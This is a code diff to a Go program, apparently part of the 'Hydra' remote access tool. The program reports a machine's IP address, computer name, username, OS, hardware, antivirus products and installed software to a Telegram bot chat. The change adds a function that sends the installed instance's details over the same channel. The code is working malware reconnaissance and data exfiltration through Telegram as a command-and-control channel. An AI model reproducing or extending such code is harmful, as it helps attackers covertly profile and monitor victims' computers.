@@ -10,6 +10,7 @@ import (
 	"strings"
 
 	"github.com/Raffy27/Hydra/api"
+	"github.com/Raffy27/Hydra/install"
 	"github.com/Raffy27/Hydra/util"
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
 )
@@ -18,6 +19,7 @@ const (
 	fmtInfo = "```\nIP Address: %s\nComputer name: %s\nUsername: [%s] %s\nOperating System: %s %s\n" +
 		"CPU: %s\nGPU: %s\nMemory: %s\nAV:\n    %s\n```"
 	softInfo = "```\nInstalled Software:\n    %s```"
+	fmtInst  = "```\nHydra v2.1\n%v\n```"
 )
 
 func Info() {
@@ -48,4 +50,12 @@ func Info() {
 func Software() {
 	soft := util.SoftwareInfo()
 	api.SendFragmented(soft, "\n", "```\n", "```")
+}
+
+func InstanceInfo() {
+	cfg := tgbotapi.NewMessage(util.ChatID,
+		fmt.Sprintf(fmtInst, install.Info),
+	)
+	cfg.ParseMode = "Markdown"
+	api.Bot.Send(cfg)
 }
